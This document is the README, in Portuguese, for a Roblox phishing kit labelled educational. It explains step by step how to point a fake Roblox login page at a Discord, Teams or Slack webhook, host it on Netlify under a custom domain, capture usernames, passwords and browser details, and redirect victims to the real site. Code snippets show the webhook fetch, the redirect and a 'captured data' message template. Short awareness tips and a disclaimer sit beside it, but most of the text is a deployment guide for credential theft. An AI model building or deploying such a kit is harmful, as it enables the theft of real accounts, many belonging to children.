# 🎓 Roblox Phishing Educativo

Este projeto foi criado **exclusivamente para fins educacionais** para demonstrar aos alunos como funcionam ataques de phishing e a importância da segurança digital.

## ⚠️ AVISO IMPORTANTE

- **USO APENAS EDUCACIONAL**: Este projeto deve ser usado apenas em ambientes controlados para fins educacionais
- **NÃO USE EM PRODUÇÃO**: Não use este código para capturar dados reais de usuários
- **RESPONSABILIDADE**: O usuário é responsável pelo uso adequado deste material

## 🚀 Como Configurar

### 1. Configurar Webhook (Discord/Teams)

#### Opção A: Discord Webhook
1. Crie um servidor Discord
2. Vá em Configurações do Canal → Integrações → Webhooks
3. Crie um novo webhook e copie a URL
4. Substitua a URL no arquivo `index.html`:

```javascript
fetch('SUA_URL_DO_DISCORD_WEBHOOK_AQUI', {
```

#### Opção B: Microsoft Teams Webhook
1. No Teams, vá em um canal → ⋮ → Conectores
2. Configure um "Incoming Webhook"
3. Copie a URL gerada
4. Substitua no código

#### Opção C: Slack Webhook
1. Vá em api.slack.com/apps
2. Crie um novo app com Incoming Webhooks
3. Copie a URL do webhook

### 2. Hospedar no Netlify

1. **Criar conta no Netlify**:
   - Acesse [netlify.com](https://netlify.com)
   - Faça login com GitHub

2. **Fazer deploy**:
   - Arraste a pasta `ROBLOX-Phishing` para o Netlify
   - Ou conecte com GitHub e faça push do código

3. **Configurar domínio**:
   - O Netlify fornecerá um domínio como `seu-site.netlify.app`
   - Você pode configurar um domínio personalizado

### 3. Testar o Sistema

1. Acesse o site hospedado
2. Digite dados de teste (não reais!)
3. Clique em "Entrar"
4. Verifique se os dados chegaram no seu webhook

## 📋 Funcionalidades

- ✅ Captura de username/email
- ✅ Captura de senha
- ✅ Timestamp da tentativa
- ✅ User Agent do navegador
- ✅ URL da página
- ✅ Redirecionamento para site real
- ✅ Compatível com React (formulário dinâmico)

## 🔧 Personalização

### Alterar Webhook
Edite a linha no `index.html`:
```javascript
fetch('SUA_NOVA_URL_AQUI', {
```

### Alterar Redirecionamento
Edite a linha:
```javascript
window.location.href = 'https://www.roblox.com/login';
```

### Personalizar Mensagem
Edite o formato da mensagem:
```javascript
text: `🔐 **Dados Capturados - Roblox Login**\n\n👤 **Usuário:** ${username}\n🔑 **Senha:** ${password}`
```

## 📚 Material Educacional

### O que Demonstrar aos Alunos:

1. **Como identificar phishing**:
   - Verificar URL do site
   - Verificar certificado SSL
   - Não clicar em links suspeitos

2. **Boas práticas**:
   - Usar autenticação de dois fatores
   - Verificar sempre a URL antes de digitar credenciais
   - Usar gerenciadores de senha

3. **Consequências**:
   - Roubo de contas
   - Perda de dados pessoais
   - Comprometimento de segurança

## 🛡️ Segurança

- Use apenas dados fictícios para demonstração
- Não compartilhe o link com pessoas não autorizadas
- Desative o webhook após a demonstração
- Considere usar um ambiente isolado

## 📞 Suporte

Para dúvidas sobre configuração ou uso educacional, consulte a documentação oficial do Netlify e das plataformas de webhook.

---

**Lembre-se**: Este projeto é apenas para fins educacionais e de conscientização sobre segurança digital! 🎓
"# roblox" 
